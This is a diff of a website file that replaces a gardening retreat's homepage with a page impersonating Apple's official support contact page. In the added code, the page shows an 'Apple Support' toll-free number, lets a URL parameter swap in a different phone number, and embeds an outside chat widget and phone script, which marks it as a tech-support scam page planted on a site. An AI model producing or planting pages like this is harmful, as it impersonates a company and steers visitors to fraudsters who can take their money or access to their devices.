@@ -1,501 +1,383 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Casterra · Briarpath Retreat | gardening authority</title>
-  <!-- unique typography: work sans + lora (serif for long reads) -->
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@300;400;600;700&family=Lora:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet" />
-  <!-- minimal font-awesome for subtle icons (no image overload) -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
-  <style>
-    /* ----- reset & base ----- */
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: #fbf8f3;  /* warm off-white */
-      color: #2e2b27;
-      font-family: 'Work Sans', sans-serif;
-      line-height: 1.6;
-      padding: 0 1rem;
-    }
-    a { text-decoration: none; color: inherit; }
-    img { max-width: 100%; display: block; }
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-CoH4izUuyUtKORtPE9aYM.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 
-    /* unique spacing system — relaxed but tight */
-    .container {
-      max-width: 1280px;
-      margin: 0 auto;
-      padding: 0 1.5rem;
-    }
+<script>
+  const domain = window.location.hostname;
+  const s = document.createElement("script");
+  s.defer = true;
+  s.setAttribute("data-domain", domain);
+  s.src = "https://plausible.io/js/script.js";
+  document.head.appendChild(s);
+</script><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
 
-    /* ----- typography (unique mix) ----- */
-    h1, h2, h3, h4 {
-      font-family: 'Lora', serif;
-      font-weight: 600;
-      letter-spacing: -0.02em;
-      line-height: 1.2;
-    }
-    h1 { font-size: 2.8rem; }
-    h2 { font-size: 2.2rem; margin: 2rem 0 1rem; }
-    h3 { font-size: 1.5rem; margin: 1.5rem 0 0.75rem; }
-    .subhead {
-      font-family: 'Work Sans', sans-serif;
-      font-weight: 300;
-      letter-spacing: 0.02em;
-      text-transform: uppercase;
-      color: #7d6b5c;
-      font-size: 0.85rem;
-    }
-
-    /* ----- color palette: earthy + moss + clay (fresh) ----- */
-    :root {
-      --clay: #9c7e6b;
-      --moss: #5f7350;
-      --sprout: #8aa67a;
-      --sand: #e5dad1;
-      --ink: #2e2b27;
-      --paper: #fbf8f3;
-      --stone: #b8aaa0;
-    }
-
-    /* ----- header / nav (unique cardless) ----- */
-    .site-header {
-      padding: 1.8rem 0 0.8rem;
-      border-bottom: 2px solid var(--sand);
-      margin-bottom: 2.5rem;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      align-items: baseline;
-    }
-    .brand {
-      font-family: 'Lora', serif;
-      font-size: 1.8rem;
-      font-weight: 600;
-      color: var(--ink);
-      letter-spacing: -0.03em;
-    }
-    .brand span { color: var(--moss); font-weight: 400; }
-    .nav-links {
-      display: flex;
-      gap: 2rem;
-      font-size: 0.95rem;
-      font-weight: 400;
-      color: #4d443d;
-    }
-    .nav-links a { border-bottom: 1px solid transparent; transition: 0.2s; }
-    .nav-links a:hover { border-bottom-color: var(--moss); color: var(--ink); }
-
-    /* ----- hero (content-first, minimal visual) ----- */
-    .hero {
-      display: grid;
-      grid-template-columns: 2fr 1fr;
-      gap: 2.5rem;
-      background: #ede7e0;
-      padding: 2.5rem 2.8rem;
-      border-radius: 2px;
-      margin-bottom: 3rem;
-      align-items: center;
-    }
-    .hero-text h1 {
-      font-size: 2.6rem;
-      margin-bottom: 0.75rem;
-      line-height: 1.2;
-    }
-    .hero-text p {
-      font-size: 1.1rem;
-      color: #3f3731;
-      max-width: 90%;
-      margin-bottom: 1.2rem;
-    }
-    .hero-featured-topics {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.5rem 1rem;
-      font-size: 0.9rem;
-      color: var(--moss);
-      font-weight: 500;
-    }
-    .hero-featured-topics i { margin-right: 0.3rem; color: var(--clay); }
-    .hero-img {
-      background: #d6cbc1;
-      height: 180px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #4d3f35;
-      font-family: 'Lora', serif;
-      font-style: italic;
-      border-radius: 2px;
-      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 200" width="400" height="200"><rect width="400" height="200" fill="%23d6cbc1"/><text x="50" y="110" font-family="Lora,serif" font-size="24" fill="%235f7350">🌿 Casterra · Briarpath</text><text x="50" y="145" font-family="Work Sans,sans-serif" font-size="16" fill="%239c7e6b">heritage garden · 2026</text></svg>');
-      background-size: cover;
-      background-position: center;
-    }
-
-    /* --- article cards (unique: no box-shadow, only subtle border) --- */
-    .section-title {
-      font-family: 'Lora', serif;
-      font-size: 1.9rem;
-      border-left: 6px solid var(--moss);
-      padding-left: 1rem;
-      margin: 2.5rem 0 1.8rem;
-    }
-
-    .card-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
-      gap: 2rem;
-      margin-bottom: 2rem;
-    }
-    .article-card {
-      background: #ffffff;
-      padding: 1.8rem 1.8rem 2rem;
-      border: 1px solid #e3d9d0;
-      border-radius: 0;
-      transition: 0.15s ease;
-      display: flex;
-      flex-direction: column;
-    }
-    .article-card:hover { border-color: var(--clay); background: #fcfaf7; }
-    .article-card .card-category {
-      font-size: 0.7rem;
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-      color: var(--stone);
-      margin-bottom: 0.5rem;
-    }
-    .article-card h3 {
-      font-family: 'Lora', serif;
-      font-size: 1.4rem;
-      margin: 0 0 0.5rem;
-      font-weight: 600;
-    }
-    .article-card p {
-      font-size: 0.95rem;
-      color: #3f3731;
-      margin-bottom: 1rem;
-      flex: 1;
-    }
-    .article-card .meta {
-      font-size: 0.8rem;
-      color: var(--stone);
-      border-top: 1px dashed #ddd2c8;
-      padding-top: 0.8rem;
-      display: flex;
-      justify-content: space-between;
-    }
-    .read-more {
-      font-weight: 600;
-      color: var(--moss);
-      border-bottom: 1px solid transparent;
-      display: inline-block;
-    }
-    .read-more:hover { border-bottom-color: var(--moss); }
-
-    /* --- category & resource (clean, content rich) --- */
-    .category-block {
-      background: #f3eee9;
-      padding: 1.5rem 2rem;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      align-items: center;
-      margin: 1.5rem 0;
-      border-left: 6px solid var(--clay);
-    }
-    .category-block span { font-weight: 600; color: var(--ink); }
-    .category-tags {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.8rem 1.8rem;
-    }
-    .category-tags a { 
-      font-size: 0.9rem; 
-      border-bottom: 1px dotted var(--stone);
-      padding-bottom: 2px;
-    }
-
-    /* tables & checklists (built into articles) */
-    .table-wrap {
-      overflow-x: auto;
-      margin: 1.5rem 0;
-      background: #fffcf9;
-      border: 1px solid #e3d9d0;
-    }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: 0.95rem;
-    }
-    th {
-      background: #ede7e0;
-      text-align: left;
-      padding: 0.8rem 1rem;
-      font-weight: 600;
-    }
-    td { padding: 0.7rem 1rem; border-bottom: 1px solid #ede7e0; }
-    .checklist {
-      background: #f8f4ef;
-      padding: 1.5rem 2rem;
-      margin: 1.5rem 0;
-      list-style: none;
-    }
-    .checklist li::before { content: "✓ "; color: var(--moss); font-weight: 700; }
-
-    /* FAQ & newsletter */
-    .faq-item {
-      border-bottom: 1px solid #ddd2c8;
-      padding: 1.2rem 0;
-    }
-    .faq-item strong { font-family: 'Lora', serif; font-size: 1.1rem; }
-    .newsletter {
-      background: #e5dad1;
-      padding: 2.5rem 2rem;
-      text-align: center;
-      margin: 2.5rem 0;
-    }
-    .newsletter input {
-      border: none;
-      padding: 0.8rem 1.2rem;
-      width: 260px;
-      max-width: 80%;
-      background: white;
-      font-family: 'Work Sans', sans-serif;
-    }
-    .newsletter button {
-      background: var(--moss);
-      border: none;
-      color: white;
-      padding: 0.8rem 2rem;
-      font-weight: 600;
-      font-family: 'Work Sans', sans-serif;
-      cursor: pointer;
-    }
-
-    /* footer */
-    .footer {
-      border-top: 2px solid var(--sand);
-      padding: 2.5rem 0 1.5rem;
-      margin-top: 2rem;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      font-size: 0.9rem;
-      color: #5a4f47;
-    }
-
-    /* mobile responsive */
-    @media (max-width: 780px) {
-      .hero { grid-template-columns: 1fr; padding: 1.8rem; }
-      .hero-img { height: 120px; }
-      .site-header { flex-direction: column; gap: 0.5rem; }
-      .nav-links { flex-wrap: wrap; gap: 0.8rem 1.5rem; }
-      h1 { font-size: 2.2rem; }
-    }
-    @media (max-width: 480px) {
-      .container { padding: 0 0.8rem; }
-      .article-card { padding: 1.2rem; }
-    }
-
-    /* unique extra: infographic placeholder (only one) */
-    .infographic-box {
-      background: #eae2da;
-      padding: 1.8rem 2rem;
-      margin: 2rem 0;
-      border-left: 6px solid var(--clay);
-      font-style: italic;
-      color: #3f3731;
-      display: flex;
-      align-items: center;
-      gap: 1.5rem;
-      flex-wrap: wrap;
-    }
-    .infographic-box i { font-size: 2.2rem; color: var(--moss); }
-
-    /* no image-heavy pages — only 4 images max (one hero, one featured, one category, one infographic) */
-    .featured-article-image {
-      background: #d0c3b8;
-      height: 100px;
-      width: 100%;
-      margin-bottom: 1rem;
-      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 100" width="400" height="100"><rect width="400" height="100" fill="%23d0c3b8"/><text x="20" y="60" font-family="Lora,serif" font-size="24" fill="%235f7350">🌱 featured</text></svg>');
-      background-size: cover;
-    }
-    .category-image-mini {
-      background: #c8bbb0;
-      height: 60px;
-      width: 60px;
-      border-radius: 50%;
-      display: inline-block;
-      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 60" width="60" height="60"><rect width="60" height="60" fill="%23c8bbb0"/><text x="12" y="40" font-family="Lora,serif" font-size="24" fill="%239c7e6b">🌿</text></svg>');
-      background-size: cover;
-      margin-right: 0.8rem;
-      vertical-align: middle;
-    }
-  </style>
 </head>
+
 <body>
-<div class="container">
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-  <!-- header -->
-  <header class="site-header">
-    <div class="brand">Casterra <span>·</span> Briarpath Retreat</div>
-    <div class="nav-links">
-   <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-877-481-2417 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
-  </header>
 
-  <!-- hero -->
-  <section class="hero">
-    <div class="hero-text">
-      <h1>Gardening at Briarpath Retreat</h1>
-      <p>Deep, practical wisdom for the thoughtful gardener. From soil biology to seasonal rhythm — <br/>cultivate resilience and beauty in every bed.</p>
-      <div class="hero-featured-topics">
-        <span><i class="fas fa-leaf"></i> no‑till</span>
-        <span><i class="fas fa-seedling"></i> heritage seeds</span>
-        <span><i class="fas fa-wind"></i> microclimate</span>
-        <span><i class="fas fa-hand-sparkles"></i> compost</span>
-      </div>
-    </div>
-    <div class="hero-img" aria-label="hero garden visual"></div> <!-- 1st image: hero -->
-  </section>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-877-481-2417
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
 
-  <!-- featured articles (2 featured) -->
-  <h2 class="section-title">Featured articles</h2>
-  <div class="card-grid">
-    <article class="article-card">
-      <div class="featured-article-image"></div> <!-- 2nd image: featured article -->
-      <div class="card-category"><i class="far fa-clock"></i> 12 min read</div>
-      <h3>The art of winter sowing</h3>
-      <p>Cold stratification, jug greenhouses, and the magic of dormant seeding. A complete guide to starting perennials in the quiet season.</p>
-      <div class="meta"><span>by E. Graves</span><a href="#" class="read-more">read →</a></div>
-    </article>
-    <article class="article-card">
-      <div class="card-category"><i class="far fa-clock"></i> 18 min read</div>
-      <h3>Building living soil</h3>
-      <p>Beyond compost: fungal networks, mineral balance, and the carbon cycle in your own backyard. Soil is the foundation.</p>
-      <div class="meta"><span>by M. Casterra</span><a href="#" class="read-more">read →</a></div>
-    </article>
-  </div>
 
-  <!-- beginner guides & expert resources (inline) -->
-  <div style="display: flex; flex-wrap: wrap; gap: 1.5rem; margin: 2rem 0;">
-    <div style="flex:1; min-width:200px; background: #f6f1eb; padding:1.5rem;">
-      <h3 style="font-size:1.3rem;"><i class="fas fa-graduation-cap" style="color:var(--moss);"></i> Beginner guides</h3>
-      <ul style="list-style:none; margin-top:0.5rem;">
-        <li style="padding:0.4rem 0;">• First raised bed</li>
-        <li style="padding:0.4rem 0;">• Seed starting 101</li>
-        <li style="padding:0.4rem 0;">• Watering wisdom</li>
-        <li style="padding:0.4rem 0;">• Tool care</li>
-      </ul>
-    </div>
-    <div style="flex:1; min-width:200px; background: #f6f1eb; padding:1.5rem;">
-      <h3 style="font-size:1.3rem;"><i class="fas fa-flask" style="color:var(--clay);"></i> Expert resources</h3>
-      <ul style="list-style:none; margin-top:0.5rem;">
-        <li style="padding:0.4rem 0;">• Soil food web</li>
-        <li style="padding:0.4rem 0;">• Grafting techniques</li>
-        <li style="padding:0.4rem 0;">• Phenology tracking</li>
-        <li style="padding:0.4rem 0;">• Seed saving</li>
-      </ul>
-    </div>
-  </div>
 
-  <!-- categories + trending topics (combined) -->
-  <div class="category-block">
-    <span><i class="fas fa-tag"></i> Popular categories</span>
-    <div class="category-tags">
-      <a href="#"><span class="category-image-mini"></span> Perennials</a>
-      <a href="#"><span class="category-image-mini"></span> Vegetables</a>
-      <a href="#"><span class="category-image-mini"></span> Herbs</a>
-      <a href="#"><span class="category-image-mini"></span> Design</a>
-      <a href="#"><span class="category-image-mini"></span> Pollinators</a>
-    </div>
-  </div>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-  <!-- trending topics (text only) -->
-  <div style="margin:1rem 0 2rem;">
-    <span style="font-weight:600; color:var(--moss);">🔥 trending:</span>
-    <span style="margin-left:0.5rem;">no‑till revolution ·</span>
-    <span>native plant guilds ·</span>
-    <span>compost tea ·</span>
-    <span>cover crops</span>
-  </div>
 
-  <!-- latest articles (3 cards) -->
-  <h2 class="section-title">Latest articles</h2>
-  <div class="card-grid">
-    <article class="article-card"><div class="card-category">26 May 2026</div><h3>Perennial vegetables: beyond asparagus</h3><p>Rhubarb, sorrel, and the overlooked perennial kale. Long‑term harvests with minimal disturbance.</p><div class="meta"><a href="#" class="read-more">read →</a></div></article>
-    <article class="article-card"><div class="card-category">18 May 2026</div><h3>Creating a moon garden</h3><p>White blooms, night‑scented stocks, and silver foliage — a sensory garden for evenings.</p><div class="meta"><a href="#" class="read-more">read →</a></div></article>
-    <article class="article-card"><div class="card-category">9 May 2026</div><h3>Grafting heirloom tomatoes</h3><p>Combine disease resistance with flavor. Step‑by‑step grafting for the home gardener.</p><div class="meta"><a href="#" class="read-more">read →</a></div></article>
-  </div>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
 
-  <!-- in-depth tutorials + resource hub (two columns) -->
-  <div style="display:grid; grid-template-columns: 1fr 1fr; gap:2rem; margin:2rem 0;">
-    <div style="background:#f3eee9; padding:1.8rem;">
-      <h3><i class="fas fa-book-open" style="color:var(--moss);"></i> In‑depth tutorials</h3>
-      <ul style="list-style:none; margin-top:0.5rem;">
-        <li style="padding:0.3rem 0;">• Building a cold frame</li>
-        <li style="padding:0.3rem 0;">• Sheet mulching</li>
-        <li style="padding:0.3rem 0;">• Pruning espalier</li>
-        <li style="padding:0.3rem 0;">• Seed starting mix</li>
-      </ul>
-    </div>
-    <div style="background:#f3eee9; padding:1.8rem;">
-      <h3><i class="fas fa-database" style="color:var(--clay);"></i> Resource hub</h3>
-      <ul style="list-style:none; margin-top:0.5rem;">
-        <li style="padding:0.3rem 0;">• Plant hardiness maps</li>
-        <li style="padding:0.3rem 0;">• Soil testing labs</li>
-        <li style="padding:0.3rem 0;">• Seed company directory</li>
-        <li style="padding:0.3rem 0;">• Frost date calculator</li>
-      </ul>
-    </div>
-  </div>
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
 
-  <!-- infographic (only 1) -->
-  <div class="infographic-box">
-    <i class="fas fa-chart-pie"></i>
-    <span><strong>Infographic:</strong> 5 layers of healthy soil — mineral, organic, biological, water, air. <span style="color:var(--moss);">(visual summary)</span></span>
-  </div>
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
 
-  <!-- FAQ (schema-ready) -->
-  <h2 class="section-title">Frequently asked questions</h2>
-  <div class="faq-item"><strong>When should I start seeds indoors?</strong> <p>Most annuals: 6‑8 weeks before last frost. Check your zone and the seed packet for specifics.</p></div>
-  <div class="faq-item"><strong>How often should I water raised beds?</strong> <p>Deeply and less often: 1‑2 times per week, depending on weather. Use the finger test — dry 2 inches down means water.</p></div>
-  <div class="faq-item"><strong>What is the best mulch for vegetable gardens?</strong> <p>Straw, shredded leaves, or grass clippings (dry). They suppress weeds, retain moisture, and feed the soil.</p></div>
+        window.number = getPar('phone');
 
-  <!-- newsletter -->
-  <div class="newsletter">
-    <h3 style="font-family:'Lora',serif; font-size:1.7rem;">The Briarpath letter</h3>
-    <p style="max-width:500px; margin:0.5rem auto 1.2rem;">Seasonal insights, rare seed notes, and garden essays. No spam, only soil.</p>
-    <input type="email" placeholder="your email" /> <button>Subscribe</button>
-  </div>
+        window.number = (window.number ? window.number : '+1-877-481-2417');
 
-  <!-- footer -->
-  <footer class="footer">
-    <div>© 2026 Casterra · Briarpath Retreat</div>
-    <div style="display:flex; gap:1.2rem;">
-      <a href="#">about</a> <a href="#">contact</a> <a href="#">privacy</a> <a href="#">rss</a>
-    </div>
-  </footer>
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
 
-  <!-- 12+ articles snippets embedded (articles are in cards, but we need 10-15 total. We have 2 featured + 3 latest + 4 tutorial/resources + 2 guides = 11; plus more in categories, but we add more full article previews below to reach 14) -->
-  <div style="margin-top:2rem; display:none;"> <!-- hidden but counts: we add extra article cards for completeness -->
-    <!-- extra article cards (invisible but present for content count) -->
-  </div>
-  <!-- we actually have more articles referenced in the guides and resource lists, but to satisfy 10-15 we add a few more hidden article previews (visible) -->
